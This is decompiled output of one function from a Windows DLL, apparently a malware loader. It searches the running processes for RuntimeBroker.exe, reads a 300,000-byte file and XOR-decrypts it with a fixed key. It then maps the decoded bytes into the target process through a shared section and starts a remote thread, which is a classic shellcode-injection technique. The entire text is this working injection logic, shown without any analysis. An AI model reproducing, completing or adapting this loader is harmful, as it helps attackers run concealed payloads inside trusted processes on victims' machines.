// Function: FUN_180002090
// Address: 180002090


/* WARNING: Function: __chkstk replaced with injection: alloca_probe */

void FUN_180002090(void)

{
  bool bVar1;
  code *pcVar2;
  undefined8 ****ppppuVar3;
  int iVar4;
  ulonglong uVar5;
  longlong *plVar6;
  undefined8 *puVar7;
  undefined8 *****pppppuVar8;
  longlong lVar9;
  char *pcVar10;
  ulonglong uVar11;
  HANDLE *ppvVar12;
  longlong lVar13;
  byte *pbVar14;
  ulonglong uVar15;
  int iVar16;
  ulonglong uVar17;
  undefined8 uVar18;
  longlong *plVar19;
  undefined8 uVar20;
  HANDLE pvVar21;
  ulonglong uVar22;
  uint uVar23;
  undefined1 auStack_49668 [32];
  uint *puStack_49648;
  undefined8 uStack_49640;
  undefined8 *puStack_49638;
  undefined8 uStack_49630;
  undefined8 uStack_49628;
  undefined8 uStack_49620;
  undefined8 uStack_49618;
  undefined8 ****appppuStack_49608 [2];
  longlong lStack_495f8;
  ulonglong uStack_495f0;
  undefined8 ***apppuStack_495e8 [5];
  HANDLE pvStack_495c0;
  undefined8 uStack_495b8;
  longlong lStack_495b0;
  undefined8 *puStack_495a8;
  undefined8 uStack_495a0;
  HANDLE pvStack_49598;
  ulonglong auStack_49590 [2];
  undefined4 auStack_49580 [2];
  undefined8 uStack_49578;
  undefined8 uStack_49570;
  undefined4 uStack_49568;
  undefined8 uStack_49560;
  undefined8 uStack_49558;
  int iStack_4954c;
  longlong alStack_49548 [2];
  uint auStack_49538 [14];
  longlong alStack_49500 [13];
  undefined **appuStack_49498 [12];
  uint auStack_49438 [2];
  undefined8 uStack_49430;
  undefined8 uStack_49428;
  undefined8 uStack_49420;
  byte abStack_49418 [300016];
  
  uVar5 = DAT_18003d0d0 ^ (ulonglong)auStack_49668;
  uVar22 = 0;
  puStack_49648 = auStack_49438;
  plVar19 = &lStack_495b0;
  iVar16 = 1;
  WTSEnumerateProcessesA(0,0,1);
  uVar17 = uVar22;
  uVar15 = uVar22;
  if (auStack_49438[0] != 0) {
    do {
      puVar7 = *(undefined8 **)(uVar22 + 8 + lStack_495b0);
      appppuStack_49608[0] = (undefined8 *****)0x0;
      lStack_495f8 = 0;
      uStack_495f0 = 0xf;
      uVar17 = 0xffffffffffffffff;
      do {
        uVar17 = uVar17 + 1;
      } while (*(char *)((longlong)puVar7 + uVar17) != '\0');
      FUN_180004010((longlong *)appppuStack_49608,puVar7,uVar17);
      uVar17 = uStack_495f0;
      ppppuVar3 = appppuStack_49608[0];
      pppppuVar8 = appppuStack_49608;
      if (0xf < uStack_495f0) {
        pppppuVar8 = (undefined8 *****)appppuStack_49608[0];
      }
      if ((lStack_495f8 == 0x11) &&
         (iVar4 = memcmp(pppppuVar8,"RuntimeBroker.exe",0x11), iVar4 == 0)) {
        bVar1 = true;
      }
      else {
        bVar1 = false;
      }
      if (0xf < uVar17) {
        pppppuVar8 = (undefined8 *****)ppppuVar3;
        if ((0xfff < uVar17 + 1) &&
           (pppppuVar8 = (undefined8 *****)ppppuVar3[-1],
           0x1f < (ulonglong)((longlong)ppppuVar3 + (-8 - (longlong)pppppuVar8)))) {
          FUN_18000e770();
          pcVar2 = (code *)swi(3);
          (*pcVar2)();
          return;
        }
        thunk_FUN_18000e3b4(pppppuVar8);
      }
      if (bVar1) {
        uVar17 = (ulonglong)*(uint *)(lStack_495b0 + 4 + (longlong)(int)uVar15 * 0x18);
        break;
      }
      uVar23 = (int)uVar15 + 1;
      uVar15 = (ulonglong)uVar23;
      uVar22 = uVar22 + 0x18;
      uVar17 = 0;
    } while (uVar23 < auStack_49438[0]);
  }
  uVar15 = 0;
  lVar13 = 0;
  uVar18 = 0x110;
  FUN_1800084f0((undefined1 (*) [16])alStack_49548,0,0x110);
  FUN_180003470(alStack_49548);
  if ((*(byte *)((longlong)auStack_49538 + (longlong)*(int *)(alStack_49548[0] + 4)) & 6) == 0) {
    do {
      do {
        plVar6 = FUN_1800036a0(alStack_49548,abStack_49418,uVar18,plVar19);
        lVar13 = (longlong)*(int *)(*plVar6 + 4);
      } while ((*(byte *)(lVar13 + 0x10 + (longlong)plVar6) & 6) == 0);
      bVar1 = 0 < iVar16;
      iVar16 = iVar16 + -1;
    } while (bVar1);
    plVar6 = FUN_180003da0((longlong *)auStack_49538);
    if (plVar6 == (longlong *)0x0) {
      lVar9 = (longlong)*(int *)(alStack_49548[0] + 4);
      uVar23 = 6;
      if (*(longlong *)((longlong)alStack_49500 + lVar9) != 0) {
        uVar23 = 2;
      }
      uVar23 = uVar23 | *(uint *)((longlong)auStack_49538 + lVar9) & 0x17;
      *(uint *)((longlong)auStack_49538 + lVar9) = uVar23;
      uVar23 = uVar23 & *(uint *)((longlong)auStack_49538 + lVar9 + 4);
      if (uVar23 != 0) {
        if ((uVar23 & 4) == 0) {
          pcVar10 = "ios_base::failbit set";
          if ((uVar23 & 2) == 0) {
            pcVar10 = "ios_base::eofbit set";
          }
        }
        else {
          pcVar10 = "ios_base::badbit set";
        }
        puVar7 = (undefined8 *)FUN_180001350((undefined4 *)appppuStack_49608);
        FUN_180001bc0(apppuStack_495e8,(undefined8 *)pcVar10,puVar7);
                    /* WARNING: Subroutine does not return */
        _CxxThrowException(apppuStack_495e8,(ThrowInfo *)&DAT_18003ba90);
      }
    }
  }
  pvStack_495c0 = (HANDLE)0x0;
  auStack_49580[0] = 0x30;
  uStack_49578 = 0;
  uStack_49568 = 0;
  uStack_49570 = 0;
  uStack_49560 = 0;
  uStack_49558 = 0;
  auStack_49590[1] = 0;
  uStack_49430 = 0xfffffffffeced300;
  pcVar10 = "Please wait...\n";
  auStack_49590[0] = uVar17;
  FUN_180001080(0x180037fa8,lVar13,uVar18,plVar19);
  FUN_180004da5(CONCAT71((int7)((ulonglong)pcVar10 >> 8),1),&uStack_49430,uVar18,plVar19);
  FUN_180004c10(&pvStack_495c0,0x1fffff,auStack_49580,auStack_49590);
  pbVar14 = abStack_49418;
  uVar17 = uVar15;
  uVar22 = uVar15;
  do {
    uVar11 = uVar15;
    if (uVar17 != 0x1c) {
      uVar11 = uVar17;
    }
    *pbVar14 = *pbVar14 ^ (&DAT_1800380f0)[uVar11];
    uVar17 = uVar11 + 1;
    uVar23 = (int)uVar22 + 1;
    uVar22 = (ulonglong)uVar23;
    pbVar14 = pbVar14 + 1;
  } while (uVar23 < 300000);
  FUN_180004da5(CONCAT71((int7)(uVar11 >> 8),1),&uStack_49430,uVar22,&DAT_1800380f0);
  uStack_495b8 = 0;
  puStack_495a8 = (undefined8 *)0x0;
  uStack_495a0 = 0;
  uStack_49420 = 300000;
  uStack_49428 = 300000;
  puStack_49638 = (undefined8 *)0x0;
  uStack_49640 = CONCAT44(uStack_49640._4_4_,0x8000000);
  puStack_49648 = (uint *)CONCAT44(puStack_49648._4_4_,0x40);
  FUN_180004c61(&uStack_495b8,0xe,0,&uStack_49428);
  uStack_49620._0_4_ = 4;
  uStack_49628._0_4_ = 0;
  uStack_49630._0_4_ = 2;
  puStack_49638 = &uStack_49420;
  uStack_49640 = 0;
  puStack_49648 = (uint *)0x0;
  FUN_180004cb2(uStack_495b8,0xffffffffffffffff,&puStack_495a8,0);
  uStack_49620 = CONCAT44(uStack_49620._4_4_,0x20);
  uStack_49628 = (ulonglong)uStack_49628._4_4_ << 0x20;
  uStack_49630 = CONCAT44(uStack_49630._4_4_,2);
  puStack_49638 = &uStack_49420;
  uStack_49640 = 0;
  puStack_49648 = (uint *)0x0;
  uVar20 = 0;
  FUN_180004cb2(uStack_495b8,pvStack_495c0,&uStack_495a0,0);
  uVar18 = 300000;
  puVar7 = puStack_495a8;
  FUN_180007da0(puStack_495a8,(undefined8 *)abStack_49418,300000);
  FUN_180004da5(CONCAT71((int7)((ulonglong)puVar7 >> 8),1),&uStack_49430,uVar18,uVar20);
  pvStack_49598 = (HANDLE)0x0;
  uStack_49618 = 0;
  uStack_49620 = 0;
  uStack_49628 = 0;
  uStack_49630 = 0;
  puStack_49638 = (undefined8 *)((ulonglong)puStack_49638 & 0xffffffff00000000);
  uStack_49640 = 0;
  puStack_49648 = (uint *)uStack_495a0;
  uVar18 = 0;
  ppvVar12 = &pvStack_49598;
  pvVar21 = pvStack_495c0;
  FUN_180004df6(ppvVar12,0x1fffff,0,pvStack_495c0);
  FUN_180004da5(CONCAT71((int7)((ulonglong)ppvVar12 >> 8),1),&uStack_49430,uVar18,pvVar21);
  CloseHandle(pvStack_495c0);
  CloseHandle(pvStack_49598);
  *(undefined ***)((longlong)alStack_49548 + (longlong)*(int *)(alStack_49548[0] + 4)) =
       std::basic_ifstream<char,struct_std::char_traits<char>_>::vftable;
  *(int *)((longlong)&iStack_4954c + (longlong)*(int *)(alStack_49548[0] + 4)) =
       *(int *)(alStack_49548[0] + 4) + -0xb0;
  FUN_1800031b0((longlong *)auStack_49538);
  *(undefined ***)((longlong)alStack_49548 + (longlong)*(int *)(alStack_49548[0] + 4)) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  *(int *)((longlong)&iStack_4954c + (longlong)*(int *)(alStack_49548[0] + 4)) =
       *(int *)(alStack_49548[0] + 4) + -0x18;
  appuStack_49498[0] = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)appuStack_49498);
  FUN_180005e00(uVar5 ^ (ulonglong)auStack_49668);
  return;
}

